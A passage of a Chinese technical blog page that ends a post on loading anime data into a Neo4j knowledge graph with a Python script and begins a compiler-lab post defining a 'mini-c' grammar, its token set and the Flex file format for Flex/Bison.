class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-#</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> py2neo <span class="keyword">import</span> Graph,Node,Relationship</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">classification = [<span class="string">&#x27;番剧名称&#x27;</span>,<span class="string">&#x27;番剧类型&#x27;</span>,<span class="string">&#x27;角色列表&#x27;</span>,<span class="string">&#x27;声优列表&#x27;</span>,<span class="string">&#x27;播放平台&#x27;</span>,<span class="string">&#x27;制作公司&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">KG</span>:</span></span><br><span class="line">    name_file = <span class="built_in">open</span>(<span class="string">&#x27;data/name.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">    name_img_file = <span class="built_in">open</span>(<span class="string">&#x27;data/name_img.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">    time_file = <span class="built_in">open</span>(<span class="string">&#x27;data/time.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">    platform_file = <span class="built_in">open</span>(<span class="string">&#x27;data/platform.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">    author_file = <span class="built_in">open</span>(<span class="string">&#x27;data/author.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">    role_img_file = <span class="built_in">open</span>(<span class="string">&#x27;data/role_img.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">    role_name_file = <span class="built_in">open</span>(<span class="string">&#x27;data/role_name.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">    role_content_file = <span class="built_in">open</span>(<span class="string">&#x27;data/role_content.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">    seiyuu_file = <span class="built_in">open</span>(<span class="string">&#x27;data/seiyuu.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">    classify_file = <span class="built_in">open</span>(<span class="string">&#x27;data/classify.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">    content_file = <span class="built_in">open</span>(<span class="string">&#x27;data/content.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">createEntity</span>(<span class="params">self,graph</span>):</span></span><br><span class="line">        cql = <span class="string">&#x27;&#x27;&#x27;CREATE (n:番剧数据库&#123;id:&#x27;0&#x27;, name:&#x27;番剧数据库&#x27;&#125;) RETURN n&#x27;&#x27;&#x27;</span></span><br><span class="line">        graph.run(cql)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i, c <span class="keyword">in</span> <span class="built_in">enumerate</span>(classification):</span><br><span class="line">            cql = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">                MERGE (a:番剧数据库&#123;id:&#x27;%d&#x27;, name:&#x27;%s&#x27;&#125;)</span></span><br><span class="line"><span class="string">                MERGE (b &#123;name: &#x27;番剧数据库&#x27;&#125;) </span></span><br><span class="line"><span class="string">                MERGE (b)-[:划分]-&gt;(a)</span></span><br><span class="line"><span class="string">                &#x27;&#x27;&#x27;</span> % (i+<span class="number">1</span>, c)</span><br><span class="line">            graph.run(cql)</span><br><span class="line"></span><br><span class="line">        name_list = self.name_file.readlines()</span><br><span class="line">        name_img_list = self.name_img_file.readlines()</span><br><span class="line">        author_list = self.author_file.readlines()</span><br><span class="line">        platform_list = self.platform_file.readlines()</span><br><span class="line">        content_list = self.content_file.readlines()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(name_list)):</span><br><span class="line">            cql = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">                MERGE (:番剧名称&#123;id:&#x27;%d&#x27;,名称:&quot;%s&quot;,图片:&#x27;%s&#x27;,内容:&#x27;%s&#x27;&#125;)</span></span><br><span class="line"><span class="string">                &quot;&quot;&quot;</span> % (i, name_list[i].replace(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;&#x27;</span>),</span><br><span class="line">                       name_img_list[i].replace(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;&#x27;</span>),</span><br><span class="line">                       content_list[i].replace(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;&#x27;</span>))</span><br><span class="line">            graph.run(cql)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;step 1 down&quot;</span>)</span><br><span class="line"></span><br><span class="line">        author_tmp_list = []</span><br><span class="line">        platform_tmp_list = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(name_list)):</span><br><span class="line">            <span class="keyword">if</span> author_list[i] <span class="keyword">not</span> <span class="keyword">in</span> author_tmp_list:</span><br><span class="line">                author_tmp_list.append(author_list[i])</span><br><span class="line">                cql = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">                    MERGE (:制作公司&#123;id:&#x27;%d&#x27;, 名称:&quot;%s&quot;&#125;)</span></span><br><span class="line"><span class="string">                    &quot;&quot;&quot;</span> % (i, author_list[i].replace(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;&#x27;</span>))</span><br><span class="line">                graph.run(cql)</span><br><span class="line">            <span class="keyword">if</span> platform_list[i] <span class="keyword">not</span> <span class="keyword">in</span> platform_tmp_list:</span><br><span class="line">                platform_tmp_list.append(platform_list[i])</span><br><span class="line">                cql = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">                    MERGE (:播放平台&#123;id:&#x27;%d&#x27;, 名称:&quot;%s&quot;&#125;)</span></span><br><span class="line"><span class="string">                    &quot;&quot;&quot;</span> % (i, platform_list[i].replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>))</span><br><span class="line">                graph.run(cql)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;step 2 down&quot;</span>)</span><br><span class="line"></span><br><span class="line">        classify_tmp_list = []</span><br><span class="line">        seiyuu_tmp_list = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(name_list)):</span><br><span class="line">            classify_list = self.classify_file.readline().split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">            seiyuu_list = self.seiyuu_file.readline().split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">            role_name_list = self.role_name_file.readline().split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">            role_img_list = self.role_img_file.readline().split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">            role_content_list = self.role_content_file.readline().split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(classify_list)):</span><br><span class="line">                <span class="keyword">if</span> classify_list[j] <span class="keyword">not</span> <span class="keyword">in</span> classify_tmp_list:</span><br><span class="line">                    classify_tmp_list.append(classify_list[j])</span><br><span class="line">                    cql = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">                        MERGE (:番剧类型&#123;类型:&#x27;%s&#x27;&#125;)</span></span><br><span class="line"><span class="string">                        &quot;&quot;&quot;</span> % (classify_list[j].replace(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;&#x27;</span>))</span><br><span class="line">                    graph.run(cql)</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(seiyuu_list)):</span><br><span class="line">                <span class="keyword">if</span> seiyuu_list[j] <span class="keyword">not</span> <span class="keyword">in</span> seiyuu_tmp_list:</span><br><span class="line">                    seiyuu_tmp_list.append(seiyuu_list[j])</span><br><span class="line">                    cql = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">                        MERGE (:声优列表&#123;名称:&#x27;%s&#x27;&#125;)</span></span><br><span class="line"><span class="string">                        &quot;&quot;&quot;</span> % (seiyuu_list[j].replace(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;&#x27;</span>))</span><br><span class="line">                    graph.run(cql)</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(role_name_list)):</span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">len</span>(role_name_list)!=<span class="built_in">len</span>(role_img_list)):</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;wrong img:&quot;</span>+role_name_list[j])</span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">len</span>(role_content_list)&lt;<span class="number">4</span>):</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                cql = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">                    MERGE (:角色列表&#123;名称:&#x27;%s&#x27;,图片:&#x27;%s&#x27;,性别:&#x27;%s&#x27;,身份:&#x27;%s&#x27;,特征:&#x27;%s&#x27;,配音:&#x27;%s&#x27;&#125;)</span></span><br><span class="line"><span class="string">                    &quot;&quot;&quot;</span> % (role_name_list[j].replace(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;&#x27;</span>),</span><br><span class="line">                           role_img_list[j].replace(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;&#x27;</span>),</span><br><span class="line">                           role_content_list[j * <span class="number">4</span> + <span class="number">0</span>].replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>),</span><br><span class="line">                           role_content_list[j * <span class="number">4</span> + <span class="number">1</span>].replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>),</span><br><span class="line">                           role_content_list[j * <span class="number">4</span> + <span class="number">2</span>].replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>),</span><br><span class="line">                           role_content_list[j * <span class="number">4</span> + <span class="number">3</span>].replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>))</span><br><span class="line">                graph.run(cql)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;step 3 down&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">createreRationship</span>(<span class="params">self,graph</span>):</span></span><br><span class="line">        self.name_file.seek(<span class="number">0</span>)</span><br><span class="line">        self.seiyuu_file.seek(<span class="number">0</span>)</span><br><span class="line">        self.platform_file.seek(<span class="number">0</span>)</span><br><span class="line">        self.role_name_file.seek(<span class="number">0</span>)</span><br><span class="line">        self.role_img_file.seek(<span class="number">0</span>)</span><br><span class="line">        self.author_file.seek(<span class="number">0</span>)</span><br><span class="line">        self.classify_file.seek(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">        name_list = self.name_file.readlines()</span><br><span class="line">        author_list = self.author_file.readlines()</span><br><span class="line">        platform_list = self.platform_file.readlines()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(name_list)):</span><br><span class="line">            classify_list = self.classify_file.readline().split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">            role_name_list = self.role_name_file.readline().split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">            role_img_list = self.role_img_file.readline().split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">            seiyuu_list = self.seiyuu_file.readline().split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(classify_list)-<span class="number">1</span>):</span><br><span class="line">                cql = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">                    MATCH (a:番剧名称&#123;id:&#x27;%d&#x27;, 名称:&quot;%s&quot;&#125;),</span></span><br><span class="line"><span class="string">                          (b:番剧类型&#123;类型:&#x27;%s&#x27;&#125;)</span></span><br><span class="line"><span class="string">                    MERGE (b)-[:类型]-&gt;(a)</span></span><br><span class="line"><span class="string">                &quot;&quot;&quot;</span> % (i,name_list[i].replace(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;&#x27;</span>),</span><br><span class="line">                       classify_list[j].replace(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;&#x27;</span>))</span><br><span class="line">                graph.run(cql)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(role_name_list)):</span><br><span class="line">                cql = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">                    MATCH (a:番剧名称&#123;id:&#x27;%d&#x27;, 名称:&quot;%s&quot;&#125;),</span></span><br><span class="line"><span class="string">                          (b:角色列表&#123;名称:&#x27;%s&#x27;,图片:&#x27;%s&#x27;&#125;)</span></span><br><span class="line"><span class="string">                    MERGE (b)-[:属于]-&gt;(a)</span></span><br><span class="line"><span class="string">                &quot;&quot;&quot;</span> % (i,name_list[i].replace(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;&#x27;</span>),</span><br><span class="line">                       role_name_list[j].replace(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;&#x27;</span>),</span><br><span class="line">                       role_img_list[j].replace(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;&#x27;</span>))</span><br><span class="line">                graph.run(cql)</span><br><span class="line"></span><br><span class="line">                cql = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">                    MATCH (a:声优列表&#123;名称:&quot;%s&quot;&#125;),</span></span><br><span class="line"><span class="string">                          (b:角色列表&#123;名称:&#x27;%s&#x27;,图片:&#x27;%s&#x27;&#125;)</span></span><br><span class="line"><span class="string">                    MERGE (a)-[:配音]-&gt;(b)</span></span><br><span class="line"><span class="string">                &quot;&quot;&quot;</span> % (seiyuu_list[j].replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>),</span><br><span class="line">                       role_name_list[j].replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>),</span><br><span class="line">                       role_img_list[j].replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>))</span><br><span class="line">                graph.run(cql)</span><br><span class="line"></span><br><span class="line">            cql = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">                MATCH (a:番剧名称&#123;id:&#x27;%d&#x27;, 名称:&quot;%s&quot;&#125;),</span></span><br><span class="line"><span class="string">                      (b:制作公司&#123;名称:&quot;%s&quot;&#125;)</span></span><br><span class="line"><span class="string">                MERGE (b)-[:制作]-&gt;(a)</span></span><br><span class="line"><span class="string">            &quot;&quot;&quot;</span> % (i,name_list[i].replace(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;&#x27;</span>),</span><br><span class="line">                   author_list[i].replace(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;&#x27;</span>))</span><br><span class="line">            graph.run(cql)</span><br><span class="line"></span><br><span class="line">            cql = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">                MATCH (a:番剧名称&#123;id:&#x27;%d&#x27;, 名称:&quot;%s&quot;&#125;),</span></span><br><span class="line"><span class="string">                      (b:播放平台&#123;名称:&quot;%s&quot;&#125;)</span></span><br><span class="line"><span class="string">                MERGE (b)-[:播放]-&gt;(a)</span></span><br><span class="line"><span class="string">            &quot;&quot;&quot;</span> % (i,name_list[i].replace(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;&#x27;</span>),</span><br><span class="line">                   platform_list[i].replace(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;&#x27;</span>))</span><br><span class="line">            graph.run(cql)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;step 4 down&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    test_graph = Graph(<span class="string">&quot;http://127.0.0.1:7474/browser/&quot;</span>, auth=(<span class="string">&quot;neo4j&quot;</span>, <span class="string">&quot;123456789&quot;</span>))</span><br><span class="line">    test_graph.run(<span class="string">&#x27;match(n) detach delete n&#x27;</span>)</span><br><span class="line">    kg = KG()</span><br><span class="line">    kg.createEntity(test_graph)</span><br><span class="line">    kg.createreRationship(test_graph)</span><br></pre></td></tr></table></figure>
<p>新设计了一个功能，使其可以列出知识图谱中所有的 <code>番剧名称</code> 实体：</p>
<img src="/2023/03/17/%E7%9F%A5%E8%AF%86%E5%9B%BE%E8%B0%B1%E5%AE%9E%E8%B7%B5%E9%A1%B9%E7%9B%AE%E5%9B%9B/1679055378300.png" class width="1679055378300"> 
<p>点击某个 <code>番剧名称</code> 实体可以查看其详细信息：</p>
<img src="/2023/03/17/%E7%9F%A5%E8%AF%86%E5%9B%BE%E8%B0%B1%E5%AE%9E%E8%B7%B5%E9%A1%B9%E7%9B%AE%E5%9B%9B/1679055425094.png" class width="1679055425094"> 
<p>点击角色列表中的 <code>角色</code> 实体，可以查看该实体的信息：</p>
<img src="/2023/03/17/%E7%9F%A5%E8%AF%86%E5%9B%BE%E8%B0%B1%E5%AE%9E%E8%B7%B5%E9%A1%B9%E7%9B%AE%E5%9B%9B/1679055506519.png" class width="1679055506519"> 

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/03/16/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86-Lab1/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/03/16/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86-Lab1/" class="post-title-link" itemprop="url">编译原理-Lab1</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-03-16 23:41:10" itemprop="dateCreated datePublished" datetime="2023-03-16T23:41:10+08:00">2023-03-16</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2023-03-19 18:27:37" itemprop="dateModified" datetime="2023-03-19T18:27:37+08:00">2023-03-19</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Knowledge/" itemprop="url" rel="index"><span itemprop="name">Knowledge</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>30k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>27 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="第一个任务"><a href="#第一个任务" class="headerlink" title="第一个任务"></a>第一个任务</h2><p>任务目标：</p>
<ul>
<li>定义一个待实现编译器的语言，用上下文无关文法定义该语言</li>
<li>写出10个该语言编写的程序样例（覆盖所有文法规则），用于后续测试</li>
<li>给该语言起一个名称</li>
</ul>
<p>上下文无关文法 CFG（Context Free Grammar）是一组替换规则，描述了语句是如何形成</p>
<p>CFG 主要作用是验证一个输入字符串 input 是否符合某个文法 G（与正则表达式比较像，但是比正则表达式功能更强大）</p>
<p>具体的语法细节本人没有详细地了解过，下面给出一个简化的C语言的文法：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">G[program]: </span><br><span class="line"> program → ExtDefList </span><br><span class="line"> ExtDefList→ExtDef ExtDefList | ε </span><br><span class="line"> ExtDef→Specifier ExtDecList ; |Specifier FunDec CompSt </span><br><span class="line"> Specifier→int | float </span><br><span class="line"> ExtDecList→VarDec | VarDec , ExtDecList </span><br><span class="line"> VarDec→ID </span><br><span class="line"> FucDec→ID ( VarList ) | ID ( ) </span><br><span class="line"> VarList→ParamDec , VarList | ParamDec </span><br><span class="line"> ParamDec→Specifier VarDec </span><br><span class="line"> </span><br><span class="line"> CompSt→&#123; DefList StmList &#125; </span><br><span class="line"> StmList→Stmt StmList | ε </span><br><span class="line"> Stmt→Exp ; | CompSt | return Exp ; </span><br><span class="line"> | if ( Exp ) Stmt | if ( Exp ) Stmt else Stmt | while ( Exp ) Stmt </span><br><span class="line"> DefList→Def DefList | ε </span><br><span class="line"> Def→Specifier DecList ; </span><br><span class="line"> DecList→Dec | Dec , DecList </span><br><span class="line"> Dec→VarDec | VarDec = Exp </span><br><span class="line"> Exp →Exp =Exp | Exp &amp;&amp; Exp | Exp || Exp | Exp &lt; Exp | Exp &lt;= Exp </span><br><span class="line"> | Exp == Exp | Exp != Exp | Exp &gt; Exp | Exp &gt;= Exp </span><br><span class="line"> | Exp + Exp | Exp - Exp | Exp * Exp | Exp / Exp | ID | INT | FLOAT </span><br><span class="line"> | ( Exp ) | - Exp | ! Exp | ID ( Args ) | ID ( ) </span><br><span class="line"> Args→Exp , Args | Exp </span><br></pre></td></tr></table></figure>
<ul>
<li>名称为 mini-c</li>
</ul>
<h2 id="第二个任务"><a href="#第二个任务" class="headerlink" title="第二个任务"></a>第二个任务</h2><ul>
<li>构建词法、语法分析器</li>
<li>用测试样例覆盖所有文法规则</li>
<li>能检出10个不同的词法错误</li>
<li>具有错误恢复功能，能检出10个不同的语法错误，并提示行号</li>
<li>对正确的样例，输出其语法树</li>
</ul>
<p><strong>工具 Flex 和 Bison</strong></p>
<p>Flex 是一个生成词法分析器的工具，利用 Flex，我们只需提供词法的正则表达式，就可自动生成对应的C代码 </p>
<p>Bison 是一种通用解析器生成器，它将带注释的上下文无关文法转换为使用 LALR(1) 解析器表的确定性 LR 或广义 LR（GLR）解析器</p>
<p>通过联合使用 Flex 和 Bison 来构造词法、语法分析程序，大致流程如下：</p>
<img src="/2023/03/16/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86-Lab1/1678937334684-1679205612532.png" class width="1678937334684"> 
<p><strong>词法分析</strong></p>
<p>核心步骤：</p>
<ul>
<li>设计能准确表示各类单词的正则表达式 </li>
<li>用正则表达式表示的词法规则等价转化为相应的有限自动机 FA</li>
<li>将其确定化、最小化，最后依据这个 FA 编写对应的词法分析程序 </li>
</ul>
<p>高级语言的词法分析器，需要识别的单词有五类：</p>
<ul>
<li>关键字（保留字），运算符，界符，常量，标识符 </li>
</ul>
<p>依据 mini-c 语言的定义，下面给出各单词的种类码和相应符号说明：  </p>
<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INT</span> → 整型常量</span><br><span class="line"><span class="keyword">FLOAT</span> → 浮点型常量</span><br><span class="line">ID → 标识符</span><br><span class="line">ASSIGNOP → = </span><br><span class="line">RELOP → &gt; | &gt;= | &lt; | &lt;= | == | != </span><br><span class="line"><span class="keyword">PLUS</span> → + </span><br><span class="line"><span class="keyword">MINUS</span> → - </span><br><span class="line">STAR → * </span><br><span class="line"><span class="keyword">DIV</span> → / </span><br><span class="line">AND → &amp;&amp; </span><br><span class="line">OR → || </span><br><span class="line">NOT → ! </span><br><span class="line">TYPE → <span class="keyword">int</span> | <span class="keyword">float</span> </span><br><span class="line"><span class="keyword">RETURN</span> → <span class="keyword">return</span> </span><br><span class="line"><span class="keyword">IF</span> → <span class="keyword">if</span> </span><br><span class="line"><span class="keyword">ELSE</span> → <span class="keyword">else</span> </span><br><span class="line"><span class="keyword">WHILE</span> → <span class="keyword">while</span> </span><br><span class="line">SEMI → ;</span><br><span class="line">COMMA → ,</span><br><span class="line">LP → (</span><br><span class="line">RP → )</span><br><span class="line">LC → &#123; </span><br><span class="line">RC → &#125; </span><br></pre></td></tr></table></figure>
<ul>
<li>这里有关的单词种类码：<code>INT,FLOAT,......,WHILE</code> 每一个对应一个整数值作为其单词的种类码</li>
<li>实现时不需要自己指定这个值，当词法分析程序生成工具 Flex 和语法分析程序生成器 Bison 联合使用时，将这些单词符号以 %token 的形式在 Bison 的文件 <code>parser.y</code> 中罗列出来，就可生成头文件 <code>parser.tab.h</code>，以枚举常量的形式给这些单词种类码进行自动编号</li>
</ul>
<p>在编写 Flex 文件之前，需要先了解 Flex 的文件格式：</p>
<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">定义部分 </span><br><span class="line"><span class="meta">%</span><span class="meta">%</span> </span><br><span class="line">规则部分 </span><br><span class="line"><span class="meta">%</span><span class="meta">%</span> </span><br><span class="line">用户子程序部分 </span><br></pre></td></tr></table></figure>
<ul>
<li>Flex 文件是文件扩展名为 <code>.l</code> 的文本文件 </li>
<li>定义部分：<ul>
<li>主要包含c语言的一些宏定义，如文件包含、宏名定义，以及一些变量和类型的定义和声明</li>
</ul>
</li>
<li>规则部分：<ul>
<li>由规则 <code>正规表达式 动作</code> 组成</li>
<li>词法分析器一旦识别出正规表达式所对应的单词，就会执行动作所对应的操作，返回单词的种类码（常规操作：把读取到的单词以各种形式保存在联合变量 YYLVAL 中）</li>
<li>词法分析器识别出一个单词后，会将该单词保存在 <code>yytext</code> 中，其长度为 <code>yyleng</code></li>
</ul>
</li>
<li>用户子程序部分：<ul>
<li>这部分代码会原封不动的被复制到词法分析器源程序 <code>lex.yy.c</code> 中</li>
</ul>
</li>
</ul>
<p>实现代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span 